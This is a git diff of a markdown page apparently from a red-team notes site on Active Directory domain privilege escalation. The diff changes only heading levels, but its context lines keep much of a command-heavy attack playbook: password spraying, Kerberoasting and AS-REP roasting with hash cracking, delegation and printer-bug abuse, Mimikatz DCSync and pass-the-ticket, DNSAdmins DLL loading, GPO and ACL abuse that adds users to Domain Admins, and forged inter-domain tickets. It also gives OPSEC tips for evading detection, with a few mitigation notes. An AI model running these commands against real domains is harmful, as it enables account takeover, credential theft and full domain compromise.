@@ -4,9 +4,9 @@ title: Domain Privilege Escalation
 
 Lets talk about some attacks to carry out a domain privilege escalation in order to obtain a Domain Controller.
 
-# Attacking Kerberos
+## Attacking Kerberos
 
-## Kerberos brute force
+### Kerberos brute force
 
 Kerberos is an authentication protocol, so it is possible to perform a bruteforce attack.
 
@@ -20,7 +20,7 @@ kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt Password
 kerbrute passwordspray --user-as-pass --dc 10.10.10.10 -d example.com users.txt
 ```
 
-## Kerberoasting
+### Kerberoasting
 
 The Kerberos session ticket as known as `TGS` has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
 
@@ -29,7 +29,7 @@ The Kerberos session ticket as known as `TGS` has a server portion which is encr
 > **OPSEC Note**: Thousands of tickets are requests, is too hard of being detected. Since some fake SPN (honeypot) can be available, never get all the Kerberos tickets automatically and search for some specifically.
 
 
-### Getting the TGS
+#### Getting the TGS
 
 First of all we need to find which users are used as *Service Accounts*:
 
@@ -124,7 +124,7 @@ You can also specify a user:
 ```
 impacket-GetUsersSPNs example.local/username:passwrod -outputfile hashes.kerberoast 
 ```
-### Cracking the tickets
+#### Cracking the tickets
 
 Once the tickets are exported it can be cracked with `john`, `hashcat` or `tgsrepcrack.py` tool:
 
@@ -139,7 +139,7 @@ To crack the ticket with hascat exists a script to export it to a hashcat format
 haschat -a 0 -m 13100 ticket.txt wordlist.txt
 ```
 
-### Mitigation
+#### Mitigation
 
 Since a lot of tickets are requested, we can see the logs in order to find all the kerberos tickets requests:
 
@@ -160,7 +160,7 @@ To prevent from kerberoasting attacks we have the following recommendations:
 * Use Managed Service ACcounts (Automatic change of password periodically and deltegated SPN Management)
 * Try to not run a service as a Domain Admin account.
 
-## AS-REP Roasting
+### AS-REP Roasting
 
 If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.
 
@@ -168,7 +168,7 @@ This configuration is also enabled on the User Object and is often seen on accou
 
 > **OPSEC Notes**: Same as Kerberoasting don't run `asreproast` by itself as this will roast every account in the domain with pre-authentication not set.
 
-### Users with No-Preauth set
+#### Users with No-Preauth set
 
 We need to enumerate accounts with Kerberos Preauth disabled:
 
@@ -187,7 +187,7 @@ Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequire
 .\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
 ```
 
-###  Requesting a ticket
+####  Requesting a ticket
 
 With `Rubeus` we can request a ASREP ticket.
 
@@ -195,7 +195,7 @@ With `Rubeus` we can request a ASREP ticket.
 .\Rubeus.exe asreproast /user:asrepuser /nowrap
 ```
 
-### Cracking the tickets
+#### Cracking the tickets
 
 We can request an encrypted AS-REP for offline brute-force. To do that task we can use `ASREPRoast` module:
 
@@ -210,7 +210,7 @@ john user01.ticket --wordlist=wordlist.txt
 hashcat -a 0 -m 18200 user01.ticket wordlist.txt
 ```
 
-# Kerberos Delegation
+## Kerberos Delegation
 
 _Kerberos Delegation_ allows to **reuse the end-user credentials** to access resources hosted on a different server. This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.
 
@@ -220,7 +220,7 @@ For example, users authenticates to a web server and web server makes requests t
 
 There are two types of delegation:
 
-## Unconstrained Delegation
+### Unconstrained Delegation
 
 When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user.
 
@@ -280,7 +280,7 @@ If we find a interesting ticket, it could be reused using _Pass-The-Ticket_:
 Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
 ```
 
-### Printer Bug
+#### Printer Bug
 
 We can abuse the printer bug if we don't want to wait for a Domain Admin to connect to the server where Unconstrained Delegation is enabled.
 
@@ -324,7 +324,7 @@ Finally we can import it with Rubeus, execute a Pass-The-Ticket and do a DCSync 
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
 ```
 
-## Constrained Delegation
+### Constrained Delegation
 
 When Contrained Delegation is enabled on a service account, allows access only to specified services on specified computers as a user.
 
@@ -357,9 +357,9 @@ C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=co
 
 First we need the TGT of the principal (machine or user) which is trusted for delegation. There are two main methods, we can extract it directly from memory or request one using NTLM or AES Keys.
 
-### Abusing Constrained Delegation
+#### Abusing Constrained Delegation
 
-#### Extracting TGT from memory
+##### Extracting TGT from memory
 
 We can extract the TGT from memory with Rubeus `dump` module. With `triage` module we can list the TGTs.
 
@@ -377,7 +377,7 @@ And finally we can dump specifying the `LUID`.
 ```
 .\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
 ```
-#### Request a new TGT with NTLM or AES Keys
+##### Request a new TGT with NTLM or AES Keys
 
 We can Request a TGT with different tools.
 
@@ -397,7 +397,7 @@ kekeo # tgt::ask /user:websvC /domain:dollarcorp.moneycorp.local /rc4:cc098f204c
 .\Rubeus.exe asktgt /user:websvC /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
 ```
 
-#### S4U Request
+##### S4U Request
 
 Once we have the TGT, we can request TGS with a S4U request.
 
@@ -417,7 +417,7 @@ kekeo # tgs::s4u /tgt:TGT_websvC@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 > **Note**: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.
 
 
-#### Inject TGS
+##### Inject TGS
 
 Finally with mimikatz we can inject the ticket on the current session:
 
@@ -433,7 +433,7 @@ It is also possible to create a process with that Tiket in order to impersonate 
 > **Note**: If we have Constrained delegation on the DC we can ask to the `LDAP TGS` in order to do a `DCSync attack`.
 
 
-### Abusing S4U2self extension
+#### Abusing S4U2self extension
 
 Machines do not get remote local admin access to themserlver over CIFS, but we can abuse S4U2self to obtain a TGS to itself, as a user we know is a local admin
 
@@ -449,14 +449,14 @@ ls \\wrkstn-1.corp.local\c$
 ```
 > **Note**: Make sure to use FQDN. 
 
-## Mitigation
+### Mitigation
 
 It is recommended to:
 
 * Limit DA/Admin logins to specific servers.
 * Set `Account is sensitive and cannot be delegated` flag for privileged accounts.
 
-## Rersource-Based Constrained Delegation (RBCD)
+### Rersource-Based Constrained Delegation (RBCD)
 
 To enable **constrained** or **unsconstrained** delegation on a computer requires the `SeEnableDelegationPrivilege` user right assignment on domain controllers, which is only granted to enterprise and domain admins.
 
@@ -521,7 +521,7 @@ Finally pass the ticket into a logon session for use.
 >
 > `Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity`
 
-### Creating a computer object
+#### Creating a computer object
 
 By default, every domain user can join up to 10 computers to the domain, this is specified on the `ms-DS-MachineAccountQuota` attribute of the domain object.
 
@@ -552,7 +552,7 @@ Finally you can ask for a TGT.
 ```powershell
 .\Rubeus.exe asktgt /user:FakeComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
 ```
-# Linux Credential Cache
+## Linux Credential Cache
 
 **Kerberos Credential Cache (ccache)** ffiles contains the kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. If we can compromise a machine, we can extract the ccache of any authenticated user and use it to request a TGS for any other service in the domain.
 
@@ -573,7 +573,7 @@ impacket-ticketConverter krb5cc_1234201102_MefMnG user.kirbi
 ```
 Finally we just need to inject it into memory.
 
-# DNSAdmins
+## DNSAdmins
 
 It is possible for the members of the **DNSAdmins** group to load arbitrary DLL with the privileges of dns.exe which is `NT AUTHORITY\SYSTEM`.
 
@@ -639,7 +639,7 @@ We can modify the source code of `kdns.c` from `mimikatz` source code in order t
 > **RedTeam Note**: If we put a reverse shell on the `mimilib.dll`, **DNS will not work properly since the reverse shell is closed**. Use another way to elevate privileges such as add the user to local administrators group.
 
 
-## Restore config
+### Restore config
 
 After execute the attack we need to restore the previous config, so we need to remove the `ServerLevelPlugin` from the DNS Parameters registry.
 
@@ -650,15 +650,15 @@ sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
 
-# Group Policy
+## Group Policy
 
 Group Policy is the central repository in a forest or domain that controls the configuration of computers and users. Group Policy Objects (GPOs) are sets of configurations that are applied to Organisational Units (OUs).
 
-## Identifying Access to GPOs
+### Identifying Access to GPOs
 
 By default, only Domain Admins can create GPOs and link them to OUs but it´s common practice to delegate those rights to other teams.
 
-### Modifying an existing GPO
+#### Modifying an existing GPO
 
 This query will return any GPO in the domain, where a 4-digit RID has WriteProperty, WriteDacl or WriteOwner. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results.
 
@@ -671,7 +671,7 @@ We can resolve the ObjectDN with:
 Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
 ```
 
-### Create and Link a GPO to a OU
+#### Create and Link a GPO to a OU
 
 * SIDs of principals that can create new GPOs (PowerView-dev)
 
@@ -687,7 +687,7 @@ Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=corp,DC=local" -Resolv
 If we can create new GPOs and link it to a OU, we can access to those servers.
 
 
-## Remote Server Administration Tools (RSAT)
+### Remote Server Administration Tools (RSAT)
 
 RSAT is a management component provided by Microsoft to help manage components in a domain. The GroupPolicy module has several cmdlets that can be used for administering GPOs.
 
@@ -729,7 +729,7 @@ Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "
 
 > **OPSEC Alert**: This leaves a Command Prompt on the screen, a better way could be `%COMSPEC% /b /c start /b /min`.
 
-## SharpGPOAbuse
+### SharpGPOAbuse
 
 `SharpGPOAbuse` allows a wider range of abusive configurations to be added to as GPO. It cannot create GPO, so it will must be created with the RSAT or modify one we already have write access to.
 
@@ -740,7 +740,7 @@ Example of adding an Immediate Scheduled Task too the PowerShell Logging GPO.
 
 > **Note**: We can wait to the GPO refresh or manually run `gpupdate /force` on the target.
 
-# Abusing ACLs
+## Abusing ACLs
 
 There may be instances across the domain where some principals have ACLs on more privileged accounts, that allow them to be abused for account-takeover. 
 
@@ -758,7 +758,7 @@ Search ACLs on the entire Domain.
 ```powershell
 Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
 ```
-## Reset User Password
+### Reset User Password
 
 If we have `GenericAll` we can change the password of a user.
 
@@ -766,14 +766,14 @@ If we have `GenericAll` we can change the password of a user.
 net user bob Password! /domain
 ```
 
-## Modify Domain Group Membership
+### Modify Domain Group Membership
 
 We can add users to a group.
 
 ```powershell
 net group "Domain Admins" bob /add /domain
 ```
-## Set SPN (Kerberoasting)
+### Set SPN (Kerberoasting)
 
 With enough privileges such as `GenericAll` or `GenericWrite`, a target user's SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.
 
@@ -818,7 +818,7 @@ Inovoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.py`.
 
-## Disable PreAuth of a User (ASREPRoasting)
+### Disable PreAuth of a User (ASREPRoasting)
 
 A user with `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
 
@@ -827,7 +827,7 @@ A user with `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
 Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
-# Across Domains (SID History)
+## Across Domains (SID History)
 
 Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.
 
@@ -836,7 +836,7 @@ There are two ways of escalating privileges between two domains of the same fore
 * Trust Tickets
 * Krbtgt hash
 
-## Child to Parent using Trust Tickets
+### Child to Parent using Trust Tickets
 
 We can escalate between domains using the trust tickets. An **inter-realm TGT** can be forged:
 
@@ -886,7 +886,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:mon
 Enter-PSSession -ComputerName corp-dc.moneycorp.local
 ```
 
-## Child to Parent using krbtgt hash
+### Child to Parent using krbtgt hash
 
 We can also escalate to the root domain with the krbtgt hash of the current domain.
 
@@ -937,7 +937,7 @@ It can also bee possible with a `Diamond Ticket` and rubeus.
 .\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /tickeruserid:500 /groups:512 /sids:S-1-5-21-560323961-2032768757-2425134131-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa  /nowrap
 ```
 
-## SID Filtering (Defending)
+### SID Filtering (Defending)
 
 **SID Filtering** avoids attacks which abuses SID history attribute across forest trust.
 
@@ -948,6 +948,6 @@ Microsoft considers a forest and no the domain to be a security boundary so its 
 * ParentChild Trust -> Disabled
 * External Trust -> Enabled
 
-## Selective Authentication (Defending)
+### Selective Authentication (Defending)
 
 In an inter-forest trust (External Trust), if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.
